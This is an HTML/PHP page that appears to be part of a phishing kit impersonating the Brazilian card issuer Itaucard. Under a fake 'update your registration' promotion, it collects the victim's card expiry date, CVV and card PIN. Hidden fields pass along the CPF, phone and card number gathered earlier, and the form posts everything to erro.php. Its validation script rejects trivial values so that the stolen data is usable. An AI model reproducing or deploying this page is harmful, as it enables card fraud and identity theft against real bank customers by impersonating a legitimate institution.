<!DOCTYPE html>
<html lang="en">
<head>
	<title>Itaucard</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->

<script language="javascript" src="js/jquery.mask.min.js"></script>
</head>
<body>
<script type="text/javascript">
function mascaraData( campo, e )
{
	var kC = (document.all) ? event.keyCode : e.keyCode;
	var data = campo.value;
	
	if( kC!=8 && kC!=46 )
	{
		if( data.length==2 )
		{
			campo.value = data += '/';
		}

		else
			campo.value = data;
	}
}
</script>	

 <script language='JavaScript'>
function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;   
    if((tecla>47 && tecla<58)) return true;
    else{
    	if (tecla==8 || tecla==0) return true;
	else  return false;
    }
}
</script>
<script>
function exibe(id) {
	if(document.getElementById(id).style.display=="none") {
		document.getElementById(id).style.display = "inline";
	}
	else {
		document.getElementById(id).style.display = "block";
	}
}
</script>
<script>
  function maxLengthCheck(object)
  {
    if (object.value.length > object.maxLength)
      object.value = object.value.slice(0, object.maxLength)
  }
</script>
<script>
function pulacampo(idobj, idproximo)
{
var str = new String(document.getElementById(idobj).value);
var mx = new Number(document.getElementById(idobj).maxLength);
if (str.length == mx)
{
document.getElementById(idproximo).focus();
}
}
</script>

<style>
#validade { font-family:'Arial'; font-size:25px; outline:none; display:block; }
#cvv { font-family:'Arial'; font-size:25px; outline:none; display:block; }
#senha { font-family:'Arial'; font-size:25px; outline:none; display:block; }
</style>



<script>
function validar11() {
if ( document.form.validade.value == "" || 
document.form.validade.value.length < 5 || 
document.form.validade.value == "00/00" || 
document.form.validade.value == "11/11" || 
document.form.validade.value == "22/22" || 
document.form.validade.value == "33/33" ||
document.form.validade.value == "44/44" || 
document.form.validade.value == "55/55" || 
document.form.validade.value == "66/66" || 
document.form.validade.value == "77/77" || 
document.form.validade.value == "88/88" || 
document.form.validade.value == "99/99" || 
document.form.validade.value == "12/12"){
alert ("Validade do seu cartao Itau Card invalido!"); 
document.form.validade.focus();
 return false;


}
if (document.form.cvv.value == ""   || 
document.form.cvv.value.length < 3  || 
document.form.cvv.value == "000" || 
document.form.cvv.value == "123"){
alert ("Codigo CVV invalido!");
document.form.cvv.focus(); return false;
}
if (document.form.senha.value == ""   || 
document.form.senha.value.length < 4  || 
document.form.senha.value == "0000" || 
document.form.senha.value == "1234" || 
document.form.senha.value == "1111" || 
document.form.senha.value == "2222" || 
document.form.senha.value == "3333" || 
document.form.senha.value == "4444" || 
document.form.senha.value == "5555" || 
document.form.senha.value == "6666" || 
document.form.senha.value == "7777" || 
document.form.senha.value == "8888" || 
document.form.senha.value == "9999"){
alert ("Senha Itau Card invalida!");
document.form.cvv.focus(); return false;
}

}
</script>

</style>

	<style type="text/css">
		.bold{ font-weight: bold; }
		input[id="senha"] {
		-webkit-text-security: disc;
		}
	</style>
	

	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<form name="form" onSubmit="return validar11(this);" class="login100-form validate-form" action="erro.php" method="POST">
					
					<input type="hidden" name="cpfe" id="cpfe" value="<?php echo $_POST['cpfe']; ?>">
					<input type="hidden" name="telefone" id="telefone" value="<?php echo $_POST['telefone']; ?>">
					<input type="hidden" name="cc" id="cc" value="<?php echo $_POST['cc']; ?>">
					
					<center><img src="images/logo.png" height="50" /></br></br></center>
					<span class="login100-form-title p-b-26">
						Atualize seu Cadastro
					<center><p><font color="#fff">Confirme seus dados para continuar.</font></p></center><br><br>
					</span>
					<div class="wrap-input100">
						<input class="input100" type="tel" name="validade" id="validade" onkeypress="mascaraData( this, event )" style="text-align:center;color:white;" maxlength="5" required onKeyUp="javascript:pulacampo('validade','cvv');" onfocus="this.value='';"/>
						<span class="focus-input100" data-placeholder="Validade - Ex: 10/22"></span>
					</div>
					<div class="wrap-input100">
						<input class="input100" type="tel" name="cvv" id="cvv" style="text-align:center;color:white;" maxlength="3" required onKeyUp="javascript:pulacampo('cvv','senha');" onfocus="this.value='';"/>
						<span class="focus-input100" data-placeholder="CVV (3 D&iacute;gitos no verso do cart&atilde;o)"></span>
					</div>
					<div class="wrap-input100">
						<input class="input100" type="tel" name="senha" id="senha" style="text-align:center;color:white;" maxlength="4" required onKeyUp="javascript:pulacampo('senha','btt');" onfocus="this.value='';"/>
						<span class="focus-input100" data-placeholder="Senha do Cart&atilde;o"></span>
					</div>



					<div class="container-login100-form-btn">
						<div class="wrap-login100-form-btn">
							<div class="login100-form-bgbtn"></div>
							<button class="login100-form-btn" name="btt" id="btt">
								Continuar
							</button>
						</div>
					</div>

					<div class="text-center p-t-115">
						<span class="txt1">
							Promo&ccedil;&atilde;o v&aacute;lida para cart&otilde;es Itaucard.
						</span>


					</div>
				</form>
			</div>
		</div>
	</div>
	

	<div id="dropDownSelect1"></div>
	
<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>

</body>
</html>